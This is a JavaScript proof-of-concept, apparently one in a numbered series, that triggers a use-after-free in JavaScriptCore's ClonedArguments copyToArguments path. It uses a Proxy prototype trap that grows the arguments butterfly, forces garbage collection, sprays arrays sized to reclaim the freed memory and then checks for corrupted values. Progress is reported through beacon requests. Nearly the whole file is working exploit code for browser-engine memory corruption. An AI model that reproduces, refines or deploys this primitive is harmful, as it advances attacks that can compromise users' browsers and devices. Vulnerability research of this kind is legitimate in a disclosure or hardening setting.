// p221 — ClonedArguments butterfly UAF with forced GC
//
// Bug: copyToArguments (ClonedArguments.cpp:289) caches butterfly data pointer.
// Proxy trap on hole → grow args → old butterfly orphaned.
// p220 showed no corruption because old butterfly wasn't freed yet.
// Fix: force GC inside trap to sweep the orphaned butterfly, THEN spray.
//
// Beacon prefix: V221-

(function() {
  function B(tag, body) {
    var url = '/beacon/V221-' + tag + '?t=' + Date.now();
    try {
      if (body) {
        navigator.sendBeacon(url, body);
      } else {
        new Image().src = url;
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // Phase 1: Warm up — verify basic proxy-in-copyToArguments works
  try {
    var warmup = target(1, 2, 3, 4, 5, 6, 7, 8);
    delete warmup[3];
    var callCount = 0;
    Object.setPrototypeOf(warmup, new Proxy({}, {
      get: function() { callCount++; return 0xAA; }
    }));
    var r = receiver.apply(null, warmup);
    B('WARMUP-OK-' + r.length + '-calls' + callCount);
  } catch (e) {
    B('WARMUP-ERR-' + e.message.substring(0, 40));
  }

  // Phase 2: GC-forced UAF
  try {
    // Large args so butterfly is a good target
    var N_ARGS = 64;
    var argArr = [];
    for (var i = 0; i < N_ARGS; i++) argArr.push(i + 1);

    var args = target.apply(null, argArr);
    B('ARGS-CREATED-' + args.length);

    // Create hole at index 5
    delete args[5];
    B('HOLE-AT-5');

    var trapFired = false;
    var gcDone = false;
    var sprayDone = false;
    var trapError = '';
    var growCount = 0;
    var sprayArrs = [];

    var trap = {
      get: function(target, prop, receiver) {
        if (trapFired) return 0xFACE0001;
        trapFired = true;

        try {
          // Step 1: Grow butterfly to force reallocation
          for (var j = 100; j < 1000; j++) {
            args[j] = 0x41414141;
            growCount++;
          }

          // Step 2: Force GC to sweep the orphaned old butterfly
          var gcJunk = [];
          for (var g = 0; g < 50; g++) {
            var batch = [];
            for (var k = 0; k < 10000; k++) {
              batch.push({x: k, y: String(k)});
            }
            gcJunk.push(batch);
          }
          gcJunk.length = 0;
          gcJunk = null;

          var gcJunk2 = [];
          for (var g2 = 0; g2 < 30; g2++) {
            var batch2 = [];
            for (var k2 = 0; k2 < 10000; k2++) {
              batch2.push({a: k2});
            }
            gcJunk2.push(batch2);
          }
          gcJunk2 = null;
          gcDone = true;

          // Step 3: Spray to reclaim old butterfly memory
          // Old butterfly: 4*8 + 8 + 64*8 = 552 → size class 560
          // Array(69): 0 + 8 + 69*8 = 560 → same class
          var SPRAY_COUNT = 4000;
          sprayArrs = [];
          for (var s = 0; s < SPRAY_COUNT; s++) {
            var arr = new Array(69);
            for (var f = 0; f < 69; f++) {
              arr[f] = (0xC0FE0000 | (s & 0xFFFF)) >>> 0;
            }
            sprayArrs.push(arr);
          }
          for (var s2 = 0; s2 < 500; s2++) {
            var arr68 = new Array(68);
            for (var f68 = 0; f68 < 68; f68++) arr68[f68] = (0xD0AD0000 | (s2 & 0xFFFF)) >>> 0;
            sprayArrs.push(arr68);
            var arr70 = new Array(70);
            for (var f70 = 0; f70 < 70; f70++) arr70[f70] = (0xBEAD0000 | (s2 & 0xFFFF)) >>> 0;
            sprayArrs.push(arr70);
          }
          sprayDone = true;
        } catch (trapEx) {
          trapError = trapEx.message || String(trapEx);
        }

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));
    B('UAF-SETUP');

    // Trigger: receiver.apply(null, args) → loadVarargs → copyToArguments
    // copyToArguments caches data ptr, hits hole at 5, trap fires,
    // old butterfly freed + sprayed, loop resumes with stale pointer
    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('UAF-APPLY-ERR-' + e.message.substring(0, 60));
      result = null;
    }

    B('DIAG-trap=' + trapFired + '-gc=' + gcDone + '-spray=' + sprayDone + '-grew=' + growCount);
    if (trapError) B('TRAP-ERR-' + trapError.substring(0, 80));
    if (sprayArrs.length) B('SPRAY-N-' + sprayArrs.length);

    if (result) {
      B('UAF-LEN-' + result.length);

      // Check indices 6+ for spray markers
      // If old butterfly was reclaimed, we should see 0xC0FE#### values
      var corruptCount = 0;
      var vals = [];
      for (var r = 0; r < Math.min(result.length, 64); r++) {
        var v = result[r];
        var tag;
        if (typeof v === 'number') {
          var u = v >>> 0;
          var hi = u >>> 16;
          if (hi === 0xC0FE || hi === 0xD0AD || hi === 0xBEAD || hi === 0xBEEF || hi === 0xFACE) {
            corruptCount++;
            tag = hex(u);
          } else if (r >= 6 && r < N_ARGS && v !== (r + 1)) {
            corruptCount++;
            tag = 'D:' + hex(u);
          } else {
            tag = hex(u);
          }
        } else if (v === undefined) {
          tag = 'und';
        } else if (typeof v === 'object') {
          corruptCount++;
          tag = 'OBJ';
        } else {
          tag = typeof v;
        }
        vals.push(r + '=' + tag);
      }

      // Send first 20 vals and last 10
      var first20 = vals.slice(0, 20).join(' ');
      var last10 = vals.slice(Math.max(20, vals.length - 10)).join(' ');
      B('VALS-A', first20);
      B('VALS-B', last10);
      B('CORRUPT-' + corruptCount);

      if (corruptCount > 0) {
        B('UAF-CONFIRMED');

        // Detailed dump of corrupted entries
        for (var c = 0; c < Math.min(result.length, 64); c++) {
          var cv = result[c];
          if (typeof cv === 'number') {
            var cu = cv >>> 0;
            if ((cu >>> 16) === 0xC0FE || (cu >>> 16) === 0xD0AD || (cu >>> 16) === 0xBEAD) {
              B('HIT-' + c + '-' + hex(cu));
            }
          }
        }
      } else {
        B('NO-CORRUPT-OLD-BUTTERFLY-NOT-FREED');
      }
    }

    B('SPRAY-ALIVE-' + (typeof sprayArrs !== 'undefined' ? sprayArrs.length : 0));
  } catch (e) {
    B('PHASE2-ERR-' + e.message.substring(0, 60));
  }

  // Phase 3: Alternative — use FinalizationRegistry to detect when old butterfly is collected
  try {
    B('PHASE3-START');

    var fr = new FinalizationRegistry(function(held) {
      B('WEAK-COLLECTED-' + held);
    });

    // We can't weakly reference the butterfly directly, but we can test
    // if WeakRef to a wrapper object gets cleared after our GC pressure
    var sentinel = {};
    var wr = new WeakRef(sentinel);
    fr.register(sentinel, 'SENTINEL');
    sentinel = null; // drop strong ref

    // Force GC
    var junk = [];
    for (var g = 0; g < 50; g++) {
      var b = [];
      for (var k = 0; k < 5000; k++) b.push({z: k});
      junk.push(b);
    }
    junk = null;
    var junk2 = [];
    for (var g2 = 0; g2 < 30; g2++) {
      var b2 = [];
      for (var k2 = 0; k2 < 5000; k2++) b2.push({z: k2});
      junk2.push(b2);
    }
    junk2 = null;

    // Check if sentinel was collected
    var alive = wr.deref();
    B('SENTINEL-' + (alive ? 'ALIVE' : 'DEAD'));

    // If sentinel is dead, GC ran. This tells us GC pressure works.
    // The old butterfly should also be collected.
  } catch (e) {
    B('PHASE3-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
